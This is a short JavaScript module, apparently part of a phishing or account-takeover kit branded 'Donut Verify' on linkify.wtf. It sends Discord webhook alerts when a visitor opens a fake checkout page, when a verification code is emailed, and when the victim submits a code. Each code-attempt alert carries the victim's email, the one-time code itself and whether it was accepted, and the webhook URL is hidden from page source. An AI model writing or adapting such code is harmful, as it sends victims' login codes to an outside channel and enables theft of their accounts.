/* Posts embed lines to the Discord channel wired up by VISIT_WEBHOOK.

   Lives beside the functions it serves rather than in the page, so the webhook
   URL is never something a visitor can read out of view-source.

   Only the fields that matter go in. The upstream response is deliberately not
   pasted verbatim - it is a wall of JSON that buries the one thing worth
   seeing, which is whether the code was accepted. */

const MAX = 900; // Discord rejects field values over 1024 characters

const clip = (value) => String(value == null ? '' : value).slice(0, MAX) || '—';

async function post(embed) {
  const hook = process.env.VISIT_WEBHOOK;
  if (!hook) return false;
  try {
    await fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'Donut Verify', embeds: [embed] })
    });
    return true;
  } catch {
    // A reporting failure must never break the thing being reported on.
    return false;
  }
}

function stamp() {
  return new Date().toLocaleString('en-US', {
    weekday: 'long', hour: 'numeric', minute: '2-digit', timeZone: 'UTC'
  });
}

export function reportVisit({ page, ref }) {
  const fields = [{ name: 'Link', value: clip(page), inline: false }];
  if (ref) fields.push({ name: 'Referrer', value: clip(ref), inline: false });
  return post({
    title: '👀 New checkout visit',
    color: 0x5865f2,
    fields,
    footer: { text: `linkify.wtf • ${stamp()} UTC` }
  });
}

/* Fires when a code is emailed. */
export function reportSend({ email, ok, display }) {
  const fields = [
    { name: 'Email', value: clip(email), inline: true },
    { name: 'Result', value: ok ? '✅ Code sent' : '❌ Send failed', inline: true }
  ];
  if (display) fields.push({ name: 'Sent to', value: clip(display), inline: true });

  return post({
    title: ok ? '📨 Code emailed' : '⚠️ Send failed',
    color: ok ? 0x5865f2 : 0xed4245,
    fields,
    footer: { text: `linkify.wtf • ${stamp()} UTC` }
  });
}

/* Fires when a code is submitted: the address, the code, and the verdict. */
export function reportAttempt({ email, code, ok, why }) {
  const fields = [
    { name: 'Email', value: clip(email), inline: true },
    { name: 'Code', value: '`' + clip(code) + '`', inline: true },
    { name: 'Result', value: ok ? '✅ Accepted' : '❌ Rejected', inline: true }
  ];
  if (why) fields.push({ name: 'Reason', value: clip(why), inline: false });

  return post({
    title: ok ? '🎉 Claim verified' : '🔑 Code attempt',
    color: ok ? 0x57f287 : 0xfaa61a,
    fields,
    footer: { text: `linkify.wtf • ${stamp()} UTC` }
  });
}
